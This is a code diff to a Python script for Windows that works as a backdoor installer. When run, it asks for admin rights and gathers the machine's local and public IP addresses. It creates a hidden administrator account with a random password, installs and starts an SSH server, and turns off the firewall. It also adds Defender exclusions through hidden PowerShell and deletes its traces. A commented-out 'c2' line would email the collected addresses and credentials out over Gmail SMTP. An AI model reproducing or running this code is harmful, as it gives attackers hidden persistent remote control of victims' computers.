@@ -5,24 +5,44 @@ from random import choice
 from string import ascii_letters
 import sys
 
+
 def rgen():
-    return "".join(choice(ascii_letters) for _ in range(choice(range(5,15))))
+    return "".join(choice(ascii_letters) for _ in range(choice(range(5, 15))))
+
+
+def gips():
+    IPS = []
+    cmds = [
+        "powershell (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress",
+        "powershell Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -UseBasicParsing -uri 'http://ifconfig.me/ip').Content)",
+        "powershell (Invoke-WebRequest -Uri 'http://icanhazip.com/').Content",
+    ]
+    for cmd in cmds:
+        try:
+            out = subprocess.check_output(
+                cmd,
+                text=True,
+            )
+            IPS.append(out)
+        except subprocess.CalledProcessError:
+            IPS.append(0)
+            pass
+        except Exception as exc:
+            IPS.append(0)
+            print(exc)
+    return IPS
+
 
 START_DIR = os.getcwd()
 APP_DATA = os.path.abspath(os.environ.get("appdata", "."))
-RUN_PATH = os.path.abspath(os.environ.get("appdata", ".") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+RUN_PATH = os.path.abspath(
+    os.environ.get("appdata", ".")
+    + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+)
 TEMP_PATH = os.path.abspath(os.environ.get("temp", "."))
 WORK_DIR = os.path.abspath(TEMP_PATH + f"\\{rgen()}")
-LIP,EIP1,EIP2 = [0,0,0]
-try:
-    LIP = subprocess.check_output("powershell (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress", text=True)
-    EIP1 = subprocess.check_output("powershell Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -UseBasicParsing -uri 'http://ifconfig.me/ip').Content)", text=True)
-    EIP2 = subprocess.check_output("powershell (Invoke-WebRequest -Uri 'http://icanhazip.com/').Content", text=True)
-except subprocess.CalledProcessError:
-    pass
-except Exception as exc:
-    print(exc)
-EMAIL = "test@example.com"
+LIP, EIP1, EIP2 = gips()
+EMAIL = "test@gmail.com"
 EPWD = "12345"
 LUSER = rgen()
 LPWD = rgen() + rgen() + rgen()
@@ -37,27 +57,14 @@ wshell.SendKeys "{ENTER}"
 WScript.Sleep 500
 wshell.SendKeys "{LEFT}"
 wshell.SendKeys "{ENTER}"
-WScript.Sleep 2000
-wshell.SendKeys "{LEFT}"
-wshell.SendKeys "{ENTER}"
-WScript.Sleep 500
-wshell.SendKeys "{LEFT}"
-wshell.SendKeys "{ENTER}"
-WScript.Sleep 1000
-wshell.SendKeys "{LEFT}"
-wshell.SendKeys "{ENTER}"
-WScript.Sleep 500
-wshell.SendKeys "{LEFT}"
-wshell.SendKeys "{ENTER}"
-WScript.Sleep 2000
-wshell.SendKeys "{LEFT}"
-wshell.SendKeys "{ENTER}"
-WScript.Sleep 500
-wshell.SendKeys "{LEFT}"
-wshell.SendKeys "{ENTER}",
 """
 RFILE = f"{WORK_DIR}\\{rgen()}.reg"
-RFILE_CONTENTS = ["Windows Registry Editor Version 5.00\n","\n","[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\\SpecialAccounts\\UserList]\n", f'"{LUSER}"' + "=dword:00000000;"]
+RFILE_CONTENTS = [
+    "Windows Registry Editor Version 5.00\n",
+    "\n",
+    "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\\SpecialAccounts\\UserList]\n",
+    f'"{LUSER}"' + "=dword:00000000;",
+]
 IMANAGER = f"{WORK_DIR}\\{rgen()}.ps1"
 IMANAGER_CONTENTS = f"""
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -99,6 +106,7 @@ powershell powershell.exe -ep bypass -windowstyle hidden Add-MpPreference -Exclu
 powershell powershell.exe -ep bypass -windowstyle hidden {IMANAGER}
 """
 
+
 def admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -121,20 +129,29 @@ def main():
     with open(CFILE, "w") as f:
         contents = [str(LIP), str(EIP1), str(EIP2), str(LUSER), str(LPWD)]
         f.writelines(contents)
-    os.system("powershell Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0")
-    os.system("powershell Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'")
-    os.system(f'powershell New-LocalUser "$env:LUSER" -Password $(ConvertTo-securestring \'{LPWD}\' -AsPlainText -Force) -FullName "$env:LUSER" -Description "recovery"; Add-LocalGroupMember -Group "Administrators" -Member "$env:LUSER"')
+    os.system(
+        "powershell Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
+    )
+    os.system(
+        "powershell Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'"
+    )
+    os.system(
+        f'powershell New-LocalUser "$env:LUSER" -Password $(ConvertTo-securestring \'{LPWD}\' -AsPlainText -Force) -FullName "$env:LUSER" -Description "recovery"; Add-LocalGroupMember -Group "Administrators" -Member "$env:LUSER"'
+    )
     os.system(f"powershell reg import {RFILE}; attrib -h -s -r C:\\Users\\{LUSER}")
+    os.remove(RFILE)
     os.system("netsh firewall set opmode disable")
     os.system("netsh Advfirewall set allprofiles state off")
-    #c2 = os.system(f'powershell Send-MailMessage -From {EMAIL} -To {EMAIL} -Subject "$env:UserName" -Attachment {CFILE} -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList {EMAIL}, (ConvertTo-securestring -String {PWORD} -AsPlainText -Force))')
+    # c2 = os.system(f'powershell Send-MailMessage -From {EMAIL} -To {EMAIL} -Subject "$env:UserName" -Attachment {CFILE} -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList {EMAIL}, (ConvertTo-securestring -String {PWORD} -AsPlainText -Force))')
     os.remove(CFILE)
-    #os.removedirs(WORK_DIR)
+    # os.removedirs(WORK_DIR)
     sys.exit()
+
 
 if __name__ == "__main__":
     if admin():
         main()
     else:
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-
+        ctypes.windll.shell32.ShellExecuteW(
+            None, "runas", sys.executable, " ".join(sys.argv), None, 1
+        )
